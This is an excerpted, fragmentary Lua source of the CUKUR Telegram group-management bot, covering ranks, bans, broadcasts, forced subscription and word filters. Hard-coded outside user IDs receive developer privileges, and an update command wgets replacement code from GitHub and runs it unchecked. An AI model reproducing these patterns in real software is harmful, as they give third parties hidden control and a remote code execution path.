...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./CUKUR.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S CUKUR -X kill
screen -S CUKUR ./CUKUR
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-CUKUR/Files_CUKUR/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1340441424,1610281882}   
...
function DevHeDo(msg) 
local hash = database:sismember(bot_id.."Dev:HeDo:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevHeDo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1610281882) then
var = true  
elseif tonumber(user_id) == tonumber(1446245824) then
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:HeDo:2", user_id) then
var = true  
...
local UserName = (data.username_ or "o_vv_vv")
...
local CUKUR_Msg = ''  
if msgs < 100 then 
CUKUR_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
CUKUR_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
CUKUR_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
CUKUR_Msg = 'متفاعل' 
elseif msgs < 1200 then 
CUKUR_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
CUKUR_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
CUKUR_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
CUKUR_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
CUKUR_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
CUKUR_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
CUKUR_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
CUKUR_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
CUKUR_Msg = 'رب التفاعل'  
end 
return CUKUR_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂.")  
...
--------------------------------------------------------------------------------------------------------------
function SourceCUKUR(msg,data) -- بداية العمل
if msg then
...
if DevHeDo(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,CUKUR_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ⌔' and DevHeDo(msg) then  
...
if text == 'تعطيل التواصل ⌔' and DevHeDo(msg) then  
...
if text == 'تفعيل البوت الخدمي ⌔' and DevHeDo(msg) then  
...
if text == 'تعطيل البوت الخدمي ⌔' and DevHeDo(msg) then  
...
if text == 'ضع كليشه ستارت ⌔' and DevHeDo(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'⌔∮ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ⌔' and DevHeDo(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'⌔∮تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ⌔' and DevHeDo(msg) then 
...
if text == 'تحديث السورس ⌔' and DevHeDo(msg) then 
os.execute('rm -rf CUKUR.lua')
os.execute('wget https://raw.githubusercontent.com/CUKUR-CR/CUKUR/main/CUKUR.lua')
send(msg.chat_id_, msg.id_,'⌔∮تم تحديث السورس \n⌔∮لديك اخر اصدار لسورس سوكر\n⌔∮الاصدار -› { v 1.5}')
dofile('CUKUR.lua')  
end
if text == 'الاصدار ⌔' and DevHeDo(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'⌔∮اصدار سورس سوكر \n⌔∮الاصدار -›{ v 1.5}')
end
if text == "ضع اسم للبوت ⌔" and DevHeDo(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ⌔' and DevHeDo(msg) then 
...
if text == 'المشتركين ⌔' and DevHeDo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n⌔∮المشتركين-›{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ⌔' and DevHeDo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n⌔∮الكروبات-›{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ⌔") and DevHeDo(msg) then
...
if text == ("قائمه العام ⌔") and DevHeDo(msg) then
...
if text == ("قائمه الكتم العام ⌔") and DevHeDo(msg) then
...
if text=="اذاعه خاص ⌔" and msg.reply_to_message_id_ == 0 and DevHeDo(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل الان اذاعتك؟ \n⌔∮للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ⌔" and msg.reply_to_message_id_ == 0 and DevHeDo(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل الان اذاعتك؟ \n⌔∮للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ⌔" and msg.reply_to_message_id_ == 0 and DevHeDo(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل الان اذاعتك؟ \n⌔∮للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ⌔" and msg.reply_to_message_id_ == 0  and DevHeDo(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ⌔" and msg.reply_to_message_id_ == 0  and DevHeDo(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔∮ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ⌔' and DevHeDo(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ⌔" and DevHeDo(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الكروبات ⌔" and DevHeDo(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'⌔∮  عدد الكروبات الان -› { '..#group..' }'..CUKURk..''..CUKUR..'\n⌔∮  الان عدد الكروبات الحقيقي -› { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevHeDo(msg) then
...
usertext = '\n⌔∮العضو -› ['..result.title_..'](t.me/'..(username or 'o_vv_vv')..')'
status  = '\n⌔∮تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevHeDo(msg) then
...
usertext = '\n⌔∮العضو -› ['..data.first_name_..'](t.me/'..(data.username_ or 'o_vv_vv')..')'
status  = '\n⌔∮تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevHeDo(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevHeDo(msg) then
...
local CUKUR1_Msg = database:get(bot_id.."CUKUR1:Add:Filter:Rp2"..text..msg.chat_id_)   
if CUKUR1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔∮العضو -› ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'o_vv_vv')..') \n⌔∮'..CUKUR1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if CUKUR_Msg and not Special(msg) then  
local CUKUR_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if CUKUR_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔∮العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌔∮["..CUKUR_Msg.."] \n")
else
send(msg.chat_id_,0,"⌔∮العضو : {["..data.first_name_.."](T.ME/o_vv_vv)}\n⌔∮["..CUKUR_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⌔∮عذرا » {["..data.first_name_.."](T.ME/o_vv_vv)}\n⌔∮عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevHeDo(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevHeDo(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevHeDo(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '⌔∮حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevHeDo(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '⌔∮حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ⌔" and DevHeDo(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "⌔∮تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ⌔$") and DevHeDo(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '⌔∮حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ⌔" and DevHeDo(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ⌔" and DevHeDo(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "⌔∮تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ⌔" and DevHeDo(msg) then  
...
database:sadd(bot_id.."CUKUR:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."CUKUR:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_MRHeDo = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRHeDo then 
names_MRHeDo = database:smembers(bot_id.."CUKUR:blocname"..msg.chat_id_) or ""
if names_MRHeDo and names_MRHeDo[1] then 
for i=1,#names_MRHeDo do 
if name_MRHeDo:match("(.*)("..names_MRHeDo[i]..")(.*)") then 
...
database:set(bot_id.."CUKUR:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."CUKUR:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."CUKUR:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."CUKUR:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."CUKUR:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function HeDo_mrHeDo_new(mrHeDo1,mrHeDo2)
if mrHeDo2 and mrHeDo2.first_name_ then 
if mrHeDo2.first_name_:match("(.*)"..database:get(bot_id.."CUKUR:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."CUKUR:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrHeDo_nnn = database:get(bot_id.."CUKUR:nump"..msg.chat_id_) or 5
local mrHeDo_nnn2 = database:get(bot_id.."CUKUR:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrHeDo_nnn2) == tonumber(mrHeDo_nnn) or tonumber(mrHeDo_nnn2) > tonumber(mrHeDo_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."CUKUR:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⌔∮ عزيزي >>["..mrHeDo2.username_.."](https://t.me/"..(mrHeDo2.username_ or "o_vv_vv")..")\n⌔∮ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."CUKUR:teh"..msg.chat_id_).."} بجانب اسمك\n⌔∮ عدد المحاولات المتبقيه {"..(tonumber(mrHeDo_nnn) - tonumber(mrHeDo_nnn2)).."}")
end
end
end
end
bnnaGet(id, HeDo_mrHeDo_new)
end
end
...
local CUKURChengName = database:get(bot_id.."CUKUR:Cheng:Name"..data.id_)
if not data.first_name_ then 
if CUKURChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..CUKURChengName..']')
database:del(bot_id.."CUKUR:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if CUKURChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."CUKUR:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local CUKURChengUserName = database:get(bot_id.."CUKUR:Cheng:UserName"..data.id_)
if not data.username_ then 
if CUKURChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..CUKURChengUserName..']')
database:del(bot_id.."CUKUR:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if CUKURChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."CUKUR:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local CUKURChengPhoto = database:get(bot_id.."CUKUR:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if CUKURChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."CUKUR:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if CUKURChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."CUKUR:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
𓍼 ⁝ 𝘊𝘜𝘒𝘜𝘙 𝘛𝘌𝘈𝘔
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓍼 ⁝ [𝘚𝘖𝘜𝘙𝘜𝘊𝘌 𝘊𝘏𝘈𝘕𝘕𝘌𝘓](https://t.me/o_vv_vv) 

𓍼 ⁝ [𝘥𝘦𝘷 ](http://t.me/Q_8OO ) 

𓍼 ⁝ [𝘵𝘸𝘴 𝘤𝘶𝘬𝘶𝘳](http://t.me/Qiii_QiiiBOT) 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
if text == 'رفع نسخه الاحتياطيه' and DevHeDo(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⌔∮بواسطه -› ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'o_vv_vv')..') \n⌔∮تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔∮بواسطه -› ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'o_vv_vv')..') \n⌔∮تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevHeDo(msg) then    
dofile('CUKUR.lua')  
send(msg.chat_id_, msg.id_, '⌔∮تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevHeDo(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevHeDo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevHeDo(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevHeDo(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevHeDo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevHeDo(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevHeDo(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevHeDo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevHeDo(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevHeDo(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevHeDo(msg) then
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,HeDo)
x = 0
tags = 0
local list = HeDo.members_
for k, v in pairs(list) do
...
if text == ("رفع مطور") and msg.reply_to_message_id_ and DevHeDo(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevHeDo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if database:get(bot_id..'DRAGOON:change:HeDo'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:HeDo'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:HeDo'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:HeDo'..msg.chat_id_,true)  
Text = '\n⌔∮تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:HeDo'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "SRC-CUKUR")
...
function Function_CUKUR(extra, result, success)
database:sadd(bot_id.."Dev:HeDo:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","⌔∮ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_CUKUR, nil)
return false 
end
...
function Function_CUKUR(extra, result, success)
database:srem(bot_id.."Dev:HeDo:2", result.sender_user_id_)
...
function Function_CUKUR(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:HeDo:2", result.id_)
...
database:del(bot_id.."Dev:HeDo:2")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔∮لعضو -› ['..data.first_name_..'](t.me/'..(data.username_ or 'o_vv_vv')..')'
status  = '\n⌔∮تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔∮العضو -› '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔∮العضــو -› ['..data.first_name_..'](t.me/'..(data.username_ or 'o_vv_vv')..')'
...
database:set(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"⌔∮ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."CUKUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."CUKUR1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"⌔∮تم منع الكلمه مع التحذير")  
database:del(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."CUKUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."CUKUR1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."CUKUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"⌔∮ارسل الكلمه الان")  
database:set(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CUKUR1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."CUKUR1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."CUKUR1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."CUKUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CUKUR1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."CUKUR1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⌔∮قائمة المنع \nٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ٴ\n"
for k,v in pairs(list) do  
local CUKUR_Msg = database:get(bot_id.."CUKUR1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." -› {"..CUKUR_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevHeDo(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'⌔∮تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevHeDo(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔∮العضو -› ['..result.title_..'](t.me/'..(text1[3] or 'o_vv_vv')..')'..'\n⌔∮تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevHeDo(msg) then  
...
if text == 'تعطيل الاذاعه' and DevHeDo(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سوكر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سوكر')
local CUKUR_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..CUKUR_Msg[math.random(#CUKUR_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevHeDo(msg) then 
...
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:HeDo:2',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevHeDo(msg) then 
...
if text == ("ردود المطور") and DevHeDo(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n⌔∮قائمة ردود المطور \nٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ٴ\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevHeDo(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد للكل' and DevHeDo(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n⌔∮ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:CUKUR:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:CUKUR:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:CUKUR:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"⌔∮ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:CUKUR:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:CUKUR:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:CUKUR:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:CUKUR:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:CUKUR:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:CUKUR:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:CUKUR:List:Rd:Sudo")
end
...
database:set(bot_id.."o_vv_vv:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."o_vv_vv:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."o_vv_vv:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."o_vv_vv:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌔∮تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."o_vv_vv:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."o_vv_vv:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سوكر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:CUKUR:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
